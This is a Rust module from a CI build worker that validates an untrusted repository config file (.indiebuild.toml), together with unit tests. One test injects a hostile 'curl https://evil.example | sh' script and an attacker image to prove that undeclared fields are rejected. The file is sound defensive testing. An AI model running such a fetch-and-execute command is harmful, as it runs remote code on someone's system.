//! Per-repository `.indiebuild.toml`.
//!
//! The contract is owned by `gha-indie-worker-cli`. This worker consumes the
//! same v1 shape, but the file still comes from the commit under test and is
//! therefore untrusted. It may confirm trusted job policy; it never becomes
//! authority for profile choice, working directory, commands, images, mounts,
//! credentials, push, or deploy behavior.

use std::{
    collections::HashSet,
    path::{Component, Path},
};

use serde::Deserialize;
use tokio::fs;

use crate::config::Config;
use crate::profiles::ProfileSpec;

pub(crate) const CONFIG_FILE: &str = ".indiebuild.toml";
pub(crate) const CONTRACT_VERSION: &str = "gha-indie-worker.indiebuild/v1";

const MAX_CONFIG_BYTES: u64 = 256 * 1024;
const MAX_TARGETS: usize = 64;
const MAX_LIST_ITEMS: usize = 128;
const MAX_NAME_BYTES: usize = 128;
const MAX_TIMEOUT_SECONDS: u32 = 86_400;

#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub(crate) enum RepositoryRole {
    Client,
    Server,
    Mixed,
}

#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub(crate) enum TargetRole {
    Client,
    Server,
}

#[derive(Clone, Copy, Debug, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub(crate) enum Platform {
    Linux,
    Macos,
    Windows,
}

/// Exact v1 target shape from `gha-indie-worker-cli`.
///
/// `deny_unknown_fields` is intentional. The worker does not delegate parsing
/// to the CLI at runtime, so silently accepting a future execution-adjacent
/// field would let the two authorities drift while both claim v1 compatibility.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct Target {
    pub name: String,
    pub role: TargetRole,
    pub path: String,
    pub profile: String,
    pub platform: Platform,
    pub artifacts: Vec<String>,
    pub cache_paths: Vec<String>,
    pub env: Vec<String>,
    pub secret_env: Vec<String>,
    pub allow_network: bool,
    pub allow_push: bool,
    pub allow_deploy: bool,
    pub timeout_seconds: u32,
}

/// Exact top-level v1 shape from `gha-indie-worker-cli`.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
pub(crate) struct RepoConfig {
    pub schema_version: String,
    pub repository_role: RepositoryRole,
    pub default_target: String,
    pub targets: Vec<Target>,
}

impl RepoConfig {
    pub fn default_target(&self) -> Result<&Target, String> {
        self.targets
            .iter()
            .find(|target| target.name == self.default_target)
            .ok_or_else(|| {
                format!(
                    "{CONFIG_FILE} default_target {:?} does not name a declared target",
                    self.default_target
                )
            })
    }

    fn validate(&self) -> Result<(), String> {
        if self.schema_version != CONTRACT_VERSION {
            return Err(format!(
                "{CONFIG_FILE} schema_version must equal {CONTRACT_VERSION:?}, got {:?}",
                self.schema_version
            ));
        }
        validate_token("default_target", &self.default_target)?;
        if self.targets.is_empty() || self.targets.len() > MAX_TARGETS {
            return Err(format!(
                "{CONFIG_FILE} targets must contain 1-{MAX_TARGETS} entries"
            ));
        }

        let mut names = HashSet::with_capacity(self.targets.len());
        let mut client_targets = 0usize;
        let mut server_targets = 0usize;
        for target in &self.targets {
            validate_target(target)?;
            if !names.insert(target.name.as_str()) {
                return Err(format!(
                    "{CONFIG_FILE} duplicate target name {:?}",
                    target.name
                ));
            }
            match target.role {
                TargetRole::Client => client_targets += 1,
                TargetRole::Server => server_targets += 1,
            }
        }
        if !names.contains(self.default_target.as_str()) {
            return Err(format!(
                "{CONFIG_FILE} default_target {:?} does not name a declared target",
                self.default_target
            ));
        }

        match self.repository_role {
            RepositoryRole::Client if server_targets != 0 => Err(format!(
                "{CONFIG_FILE} repository_role=client cannot contain server targets"
            )),
            RepositoryRole::Server if client_targets != 0 => Err(format!(
                "{CONFIG_FILE} repository_role=server cannot contain client targets"
            )),
            RepositoryRole::Mixed if client_targets == 0 || server_targets == 0 => Err(format!(
                "{CONFIG_FILE} repository_role=mixed requires both client and server targets"
            )),
            _ => Ok(()),
        }
    }
}

pub(crate) fn parse(contents: &str) -> Result<RepoConfig, String> {
    let config: RepoConfig = toml::from_str(contents)
        .map_err(|error| format!("{CONFIG_FILE} is not valid: {error}"))?;
    config.validate()?;
    Ok(config)
}

/// Read the file from a cloned repository, if it has one.
pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> {
    let path = repo_dir.join(CONFIG_FILE);
    // `metadata` follows symlinks. A PR can commit a symlink named
    // `.indiebuild.toml`; reject that before any host path can be read.
    let metadata = match fs::symlink_metadata(&path).await {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(format!("failed to stat {CONFIG_FILE}: {error}")),
    };
    if metadata.file_type().is_symlink() {
        return Err(format!("{CONFIG_FILE} must not be a symlink"));
    }
    if !metadata.is_file() {
        return Err(format!("{CONFIG_FILE} is not a regular file"));
    }
    if metadata.len() > MAX_CONFIG_BYTES {
        return Err(format!(
            "{CONFIG_FILE} is larger than {MAX_CONFIG_BYTES} bytes"
        ));
    }
    let contents = fs::read_to_string(&path)
        .await
        .map_err(|error| format!("failed to read {CONFIG_FILE}: {error}"))?;
    parse(&contents).map(Some)
}

/// Validate the repository-declared profile against trusted operator policy.
///
/// Head-commit config may confirm the already-admitted profile but may not
/// replace it with any other profile, even another globally allowed one.
pub(crate) fn select_profile(
    _config: &Config,
    repo_config: Option<&RepoConfig>,
    requested: &'static ProfileSpec,
) -> Result<&'static ProfileSpec, String> {
    let Some(repo_config) = repo_config else {
        return Ok(requested);
    };
    let target = repo_config.default_target()?;
    if target.platform != Platform::Linux {
        return Err(format!(
            "{CONFIG_FILE} target {:?} wants platform {:?}, and this worker only runs linux",
            target.name, target.platform
        ));
    }
    if target.profile != requested.name {
        return Err(format!(
            "{CONFIG_FILE} selects profile {:?}, but trusted job policy requires {:?}; head-commit config cannot override the operator-selected profile",
            target.profile, requested.name
        ));
    }
    Ok(requested)
}

/// Head-commit config is not execution authority for the working directory.
pub(crate) fn context_override(repo_config: Option<&RepoConfig>) -> Option<String> {
    let target = repo_config?.default_target().ok()?;
    let _descriptive_path = target.path.as_str();
    None
}

fn validate_target(target: &Target) -> Result<(), String> {
    validate_token("target.name", &target.name)?;
    validate_token("target.profile", &target.profile)?;
    validate_repo_relative_path("target.path", &target.path)?;
    validate_path_list("target.artifacts", &target.artifacts)?;
    validate_path_list("target.cache_paths", &target.cache_paths)?;
    validate_env_list("target.env", &target.env)?;
    validate_env_list("target.secret_env", &target.secret_env)?;

    let plain = target.env.iter().map(String::as_str).collect::<HashSet<_>>();
    if let Some(duplicate) = target
        .secret_env
        .iter()
        .map(String::as_str)
        .find(|name| plain.contains(name))
    {
        return Err(format!(
            "{CONFIG_FILE} environment name {duplicate:?} cannot be declared in both env and secret_env"
        ));
    }
    if target.role == TargetRole::Client && (target.allow_push || target.allow_deploy) {
        return Err(format!(
            "{CONFIG_FILE} client target {:?} cannot enable image push or deployment",
            target.name
        ));
    }
    if target.timeout_seconds == 0 || target.timeout_seconds > MAX_TIMEOUT_SECONDS {
        return Err(format!(
            "{CONFIG_FILE} target {:?} timeout_seconds must be 1-{MAX_TIMEOUT_SECONDS}",
            target.name
        ));
    }

    // These fields are currently descriptive only in the worker, but validate
    // them exactly like the CLI so v1 cannot silently mean two different things.
    let _ = target.allow_network;
    Ok(())
}

fn validate_token(label: &str, value: &str) -> Result<(), String> {
    if value.is_empty() || value.len() > MAX_NAME_BYTES {
        return Err(format!(
            "{CONFIG_FILE} {label} must be 1-{MAX_NAME_BYTES} bytes"
        ));
    }
    if value.chars().any(char::is_control) || value.chars().any(char::is_whitespace) {
        return Err(format!(
            "{CONFIG_FILE} {label} cannot contain whitespace or control characters"
        ));
    }
    Ok(())
}

fn validate_path_list(label: &str, values: &[String]) -> Result<(), String> {
    if values.len() > MAX_LIST_ITEMS {
        return Err(format!(
            "{CONFIG_FILE} {label} can contain at most {MAX_LIST_ITEMS} entries"
        ));
    }
    let mut unique = HashSet::with_capacity(values.len());
    for value in values {
        validate_repo_relative_path(label, value)?;
        if !unique.insert(value.as_str()) {
            return Err(format!("{CONFIG_FILE} duplicate {label} entry {value:?}"));
        }
    }
    Ok(())
}

fn validate_repo_relative_path(label: &str, value: &str) -> Result<(), String> {
    if value.trim().is_empty() || value.len() > 240 {
        return Err(format!(
            "{CONFIG_FILE} {label} must be a non-empty repository-relative path of at most 240 bytes"
        ));
    }
    let path = Path::new(value);
    if path.is_absolute() {
        return Err(format!(
            "{CONFIG_FILE} {label} must be relative to the repository root"
        ));
    }
    for component in path.components() {
        match component {
            Component::Normal(part) => {
                let part = part
                    .to_str()
                    .ok_or_else(|| format!("{CONFIG_FILE} {label} must be valid UTF-8"))?;
                if part
                    .chars()
                    .any(|ch| matches!(ch, ',' | '=' | ':' | '\0') || ch.is_control())
                {
                    return Err(format!(
                        "{CONFIG_FILE} {label} contains unsupported path characters"
                    ));
                }
            }
            Component::CurDir => {}
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                return Err(format!(
                    "{CONFIG_FILE} {label} must stay inside the repository root"
                ));
            }
        }
    }
    Ok(())
}

fn validate_env_list(label: &str, values: &[String]) -> Result<(), String> {
    if values.len() > MAX_LIST_ITEMS {
        return Err(format!(
            "{CONFIG_FILE} {label} can contain at most {MAX_LIST_ITEMS} entries"
        ));
    }
    let mut unique = HashSet::with_capacity(values.len());
    for value in values {
        if value.is_empty() || value.len() > MAX_NAME_BYTES {
            return Err(format!(
                "{CONFIG_FILE} {label} names must be 1-{MAX_NAME_BYTES} bytes"
            ));
        }
        let mut chars = value.chars();
        let first = chars.next().expect("checked non-empty");
        if !(first.is_ascii_alphabetic() || first == '_')
            || !chars.all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
        {
            return Err(format!(
                "{CONFIG_FILE} {label} entry {value:?} is not a valid environment variable name"
            ));
        }
        if !unique.insert(value.as_str()) {
            return Err(format!("{CONFIG_FILE} duplicate {label} entry {value:?}"));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profiles;

    const CANONICAL: &str = r#"schema_version = "gha-indie-worker.indiebuild/v1"
repository_role = "client"
default_target = "cli"

[[targets]]
name = "cli"
role = "client"
path = "."
profile = "rust-verify"
platform = "linux"
artifacts = []
cache_paths = []
env = []
secret_env = []
allow_network = true
allow_push = false
allow_deploy = false
timeout_seconds = 1800
"#;

    fn test_config(allowed: &[&str]) -> Config {
        let mut config = crate::config::config_from_env();
        config.allowed_profiles = allowed.iter().map(|name| (*name).to_string()).collect();
        config
    }

    fn rust_verify() -> &'static ProfileSpec {
        profiles::find("rust-verify").expect("rust-verify is installed")
    }

    #[test]
    fn canonical_cli_contract_is_accepted() {
        let parsed = parse(CANONICAL).expect("canonical config parses");
        assert_eq!(parsed.repository_role, RepositoryRole::Client);
        assert_eq!(parsed.default_target().expect("target").profile, "rust-verify");
    }

    #[test]
    fn unknown_fields_are_rejected_instead_of_becoming_silent_schema_drift() {
        let hostile = format!(
            "{CANONICAL}\nimage = \"attacker/evil:latest\"\nscript = \"curl https://evil.example | sh\"\n"
        );
        let error = parse(&hostile).expect_err("v1 must reject undeclared fields");
        assert!(error.contains("unknown field") || error.contains("not valid"), "{error}");
    }

    #[test]
    fn a_head_commit_cannot_downgrade_to_another_allowed_profile() {
        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
        let parsed = parse(&config).expect("parses");
        let error = select_profile(
            &test_config(&["rust-verify", "node-verify"]),
            Some(&parsed),
            rust_verify(),
        )
        .expect_err("head config must not replace trusted job policy");
        assert!(error.contains("cannot override"), "{error}");
    }

    #[test]
    fn no_config_keeps_the_requested_profile() {
        let selected =
            select_profile(&test_config(&["rust-verify"]), None, rust_verify()).expect("default");
        assert_eq!(selected.name, "rust-verify");
    }

    #[test]
    fn a_foreign_schema_version_is_refused() {
        let wrong = CANONICAL.replace(CONTRACT_VERSION, "something-else/v9");
        let error = parse(&wrong).expect_err("schema version must match");
        assert!(error.contains("schema_version"), "{error}");
    }

    #[test]
    fn a_non_linux_target_does_not_quietly_run_on_linux() {
        let windows = CANONICAL.replace("platform = \"linux\"", "platform = \"windows\"");
        let parsed = parse(&windows).expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("platform must be honoured");
        assert!(error.contains("only runs linux"), "{error}");
    }

    #[test]
    fn cli_validation_rules_are_replayed_in_the_worker() {
        assert!(parse(&CANONICAL.replace("path = \".\"", "path = \"../outside\"")).is_err());
        assert!(parse(&CANONICAL.replace("timeout_seconds = 1800", "timeout_seconds = 0")).is_err());
        assert!(parse(&CANONICAL.replace("env = []", "env = [\"A\"]").replace("secret_env = []", "secret_env = [\"A\"]")).is_err());
        assert!(parse(&CANONICAL.replace("allow_push = false", "allow_push = true")).is_err());
    }

    #[test]
    fn a_head_commit_cannot_redirect_verification_to_an_easier_subtree() {
        assert_eq!(context_override(Some(&parse(CANONICAL).unwrap())), None);
        let nested = CANONICAL.replace("path = \".\"", "path = \"services/easy-fixture\"");
        assert_eq!(context_override(Some(&parse(&nested).unwrap())), None);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn symlinked_config_is_rejected_without_following_it() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join(format!(
            "gha-indie-worker-indiebuild-{}",
            uuid::Uuid::new_v4()
        ));
        std::fs::create_dir_all(&root).expect("temp root");
        let outside = root.with_extension("outside.toml");
        std::fs::write(&outside, CANONICAL).expect("outside config");
        symlink(&outside, root.join(CONFIG_FILE)).expect("symlink config");

        let error = read(&root)
            .await
            .expect_err("worker must reject a config symlink before reading its target");
        assert!(error.contains("must not be a symlink"), "{error}");

        let _ = std::fs::remove_file(root.join(CONFIG_FILE));
        let _ = std::fs::remove_dir(&root);
        let _ = std::fs::remove_file(&outside);
    }
}
